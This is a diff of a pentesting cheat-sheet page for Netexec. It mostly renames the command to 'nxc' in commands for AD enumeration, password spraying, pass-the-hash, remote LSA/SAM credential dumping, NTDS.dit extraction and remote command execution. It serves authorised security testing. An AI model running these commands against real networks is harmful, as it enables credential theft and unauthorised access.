@@ -3,8 +3,9 @@ title = "Netexec"
 +++
 
 - https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
+- Logs: `~/.nxc/logs/`
 
-Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks. It's a network exploitation tool that helps automate assessing the security of large networks by providing tactics and techniques for testing security controls in an Active Directory environment.
+Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks that helps automate assessing the security of large networks in AD environments
 
 ## Password Policy Enumeration
 
@@ -12,10 +13,10 @@ Enumerate password policy information via SMB:
 
 ```bash
 # Anonymous password policy enumeration
-netexec smb <TARGET> --pass-pol
+nxc smb <TARGET> --pass-pol
 
 # Authenticated password policy enumeration
-netexec smb <TARGET> -u <USER> -p <PASS> --pass-pol
+nxc smb <TARGET> -u <USER> -p <PASS> --pass-pol
 ```
 
 ## User Enumeration
@@ -24,27 +25,27 @@ netexec smb <TARGET> -u <USER> -p <PASS> --pass-pol
 
 ```bash
 # Enumerate users via SMB (anonymous or authenticated)
-netexec smb <TARGET> --users
+nxc smb <TARGET> --users
 
 # Authenticated user enumeration
-netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
+nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
 ```
 
 ### Enumerate Groups
 
 ```bash
 # Enumerate groups
-netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --groups
+nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --groups
 
 # Find high value users (e.g., Domain Admins)
-netexec smb <TARGET> -u <USER> -p <PASSWORD> --groups "Domain Admins"
+nxc smb <TARGET> -u <USER> -p <PASSWORD> --groups "Domain Admins"
 ```
 
 ## Share Enumeration
 
 ```bash
 # List available shares
-netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
+nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
 ```
 
 ## Password Spraying
@@ -54,13 +55,13 @@ Password spraying uses one password against many users (alternates users), which
 **Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if you don't know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
 
 ```bash
-# Check netexec -h for services
+# Check nxc -h for services
 # Password spraying (many users vs 1 password)
-netexec smb <TARGET> -u <USERS> -p <PASSWORD> | grep '+'
+nxc smb <TARGET> -u <USERS> -p <PASSWORD> | grep '+'
 
 # Local authentication (tries local authentication instead of domain authentication)
 # Mitigated with: https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview
-netexec smb <TARGET> -u <USERS> -p <PASSWORD> --local-auth | grep '+'
+nxc smb <TARGET> -u <USERS> -p <PASSWORD> --local-auth | grep '+'
 ```
 
 ## Pass the Hash (PtH)
@@ -72,10 +73,10 @@ Netexec supports pass-the-hash attacks for lateral movement:
 # -d . = Local Account | -d <DOMAIN> = Domain Account
 # --local-auth forces local check if implied domain fails
 # :<PASS_HASH> implies empty LM hash (LM:NT)
-netexec smb <TARGET> -u <USER> -d . -H <PASS_HASH> --local-auth
+nxc smb <TARGET> -u <USER> -d . -H <PASS_HASH> --local-auth
 
 # Domain account with hash
-netexec smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
+nxc smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
 ```
 
 ## Credential Dumping
@@ -86,7 +87,7 @@ Remotely dump LSA secrets from a target:
 
 ```bash
 # Dump LSA secrets remotely
-netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
+nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
 ```
 
 ### SAM Database
@@ -95,7 +96,7 @@ Remotely dump SAM database secrets:
 
 ```bash
 # Dump SAM secrets remotely
-netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
+nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
 ```
 
 ## Active Directory Operations
@@ -104,10 +105,11 @@ netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
 
 ```bash
 # Verify credentials against a domain controller
-netexec smb <DC_IP> -u <USER> -p <PASSWORD>
+nxc smb <DC_IP> -u <USER> -p <PASSWORD>
 
 # Execute command with verified credentials
-sudo netexec smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
+# NOTE: requires sudo to setup SMB server
+sudo nxc smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
 ```
 
 ### NTDS.dit Extraction
@@ -116,7 +118,7 @@ Extract the NTDS.dit file (keys of the kingdom) from a domain controller:
 
 ```bash
 # Extract NTDS.dit using ntdsutil module
-netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
+nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
 ```
 
 ## LDAP Operations
@@ -127,7 +129,7 @@ Find high-value users with adminCount=1 (includes Domain Admins, Enterprise Admi
 
 ```bash
 # Enumerate users with adminCount=1 via LDAP
-netexec ldap <TARGET> -u <USER> -p <PASSWORD> --admin-count
+nxc ldap <TARGET> -u <USER> -p <PASSWORD> --admin-count
 ```
 
 ## Command Execution
@@ -138,10 +140,10 @@ Execute commands on remote systems:
 
 ```bash
 # Execute command on target
-sudo netexec smb <TARGET> -u <USER> -p <PASSWORD> -x '<COMMAND>'
+sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -x '<COMMAND>'
 
 # Execute command with domain credentials
-sudo netexec smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
+sudo nxc smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
 ```
 
 ## Protocol Selection
@@ -149,7 +151,7 @@ sudo netexec smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
 Netexec supports multiple protocols. Check available services with:
 
 ```bash
-netexec -h
+nxc -h
 ```
 
 Common protocols include:
